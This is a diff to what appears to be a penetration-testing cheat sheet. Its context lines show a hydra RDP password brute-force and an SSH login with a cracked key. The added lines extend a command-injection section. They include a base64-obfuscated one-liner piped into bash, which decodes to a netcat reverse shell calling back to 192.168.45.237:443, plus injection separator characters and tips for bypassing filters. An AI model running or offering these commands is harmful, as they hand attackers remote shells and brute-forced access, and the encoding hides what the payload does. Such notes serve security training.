@@ -3013,11 +3013,25 @@ hydra -t 1 -V -f -l administrator -P Desktop/rockyou.txt rdp://192.168.100.55
 	3) Connect up like so: ssh -i id_rsa daniela@192.168.50.244
 		Enter in the password found from john. id_rsa is required to be specified during connection
   
-  # Command Injection Via Base64
+  # Command Injection
 
-  	$(echo "BASE64_ENCODED_COMMAND" | base64 -d)
- 		Will decode and run the command. Useful when escaping filters.
-  
+ 	Base64:	
+  		echo $command | base64 
+		echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxiYXNoIC1pIDI+JjF8bmMgMTkyLjE2OC40NS4yMzcgNDQzID4vdG1wL2Y= | base64 -d | bash	
+  		$(echo "BASE64_ENCODED_COMMAND" | base64 -d)
+
+	Injection Chars:
+		&
+		;
+		Newline (0x0a or \n)
+		&&
+		|
+		||
+
+	  Tricks:
+	  	Read the PHP file to see what exactly is blocked.
+	   		"cat injection.php"
+     
   # Wordpress
 
  	Reverse Shell Via Theme Editor: 
